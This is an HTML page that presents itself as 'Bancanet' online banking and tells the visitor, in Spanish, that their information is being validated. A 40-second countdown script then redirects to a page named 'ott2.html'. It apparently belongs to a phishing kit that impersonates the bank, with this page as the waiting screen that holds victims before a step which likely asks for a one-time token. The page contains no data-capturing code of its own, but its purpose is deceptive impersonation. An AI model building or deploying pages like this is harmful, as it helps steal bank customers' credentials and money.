

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="sc.css">
</head>
<body class="body" style="">
    


<div class="nav">
.
</div>
<img class="laf" src="log2.png" alt="">

<br><br><br><br>

<center>

<div class="caja"> 


<form action="">


    <img class="img" src="log.png" alt="">

    <br>
    <br>

<a >Bienvenido a Bancanet</a>


 <br>  
 <br>


<a class="ltr3" >Estamos validando tu información por favor espera, esto podria demorar  
        <span id="countdown"> </span> Segundos. </a>
    

     <div class="container se">
     </div>
     <div>
<img style="margin-top: 40px;
    width: 80px;
" src="loading.gif"></img></div>
     <script >

var segundoInicio = 40;

function actualizar() {
    document.getElementById('countdown').innerHTML = segundoInicio;

    if (segundoInicio == 0) {
        //cuenta regresiva ha finalizado
        
        window.location.href = "ott2.html";
    } else {

       // segundoInicio-=1;
        /* 0 */
        segundoInicio = segundoInicio -1;
        setTimeout(actualizar, 1E3);
    }
}

actualizar();


     </script>

</form>

</div>


















</body>
</html>